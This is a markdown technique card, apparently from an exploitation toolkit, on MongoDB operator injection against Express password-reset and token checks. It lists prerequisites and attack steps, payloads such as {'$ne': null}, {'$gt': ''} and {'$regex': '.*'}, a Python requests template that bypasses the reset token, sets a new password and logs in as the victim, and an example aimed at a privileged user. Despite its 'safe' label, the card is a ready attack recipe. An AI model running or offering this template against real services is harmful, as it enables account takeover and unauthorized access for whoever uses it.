---
name: nosql_operator_injection_token_bypass
vuln_type: nosqli
sub_technique: operator_injection
category: exploitation
safety_level: safe
tags:
- nosql
- mongodb
- operator-injection
- password-reset
- auth-bypass
---

# Mongodb Operator Injection ($Ne/$Gt/$Regex) — Auth/Token Bypass

## When to Apply

An Express/Node server parses `req.body` as JSON and passes the value directly to a MongoDB query (`findOne({field: value})`). Since `bodyParser.json()` also parses objects/arrays, sending `{"field": {"$ne": null}}` results in `findOne({field: {$ne: null}})` → matches all documents where token/password/secret is not null. Applies to password reset, API key verification, 2FA token checks, etc.

## Prerequisites

- Express bodyParser.json() or similar JSON body parser in use
- req.body values are passed to MongoDB queries without sanitization
- Documents with non-null values exist in the DB for the target field
- Mongoose SchemaType validation is not restricted to String, or can be bypassed

## Steps

1. Identify API that sends token/code in the body (e.g. password reset)
2. First, trigger normal flow to generate a token for the target account (e.g. send email)
3. Send `{"$ne": null}` in the token field → matches any user with an existing token
   Variants: `{"$gt": ""}` (all values greater than empty string), `{"$regex": ".*"}` (all values)
4. Change password / bypass 2FA / hijack session for the matched user
5. Login with the changed credentials

## Code Template

```
import requests
# Step 1: generate reset token for target
requests.post(f'{TARGET}/api/auth/reset',
              json={{'email': '{target_email}', 'sendMail': False}})
# Step 2: bypass token with $ne operator
r = requests.post(f'{TARGET}/api/auth/reset',
                  json={{'token': {{'$ne': None}}, 'password': '{new_password}'}})
# Step 3: login with new password
s = requests.Session()
s.post(f'{TARGET}/api/auth/login',
       json={{'email': '{target_email}', 'password': '{new_password}'}})
```

## Examples

### Example 1

- **endpoint**: POST /api/auth/reset
- **vulnerable_code**: User.findOne({resetPassToken: token})
- **payload**: {"token": {"$ne": null}, "password": "newpw"}
- **target_role**: privileged user

resetPassword flow: (1) email→generateToken → sets resetPassToken, (2) token→sendResetPassword → User.findOne({resetPassToken: token}). sendMail=false generates the token without sending email. $ne:null matches any user with an existing token → password reset.
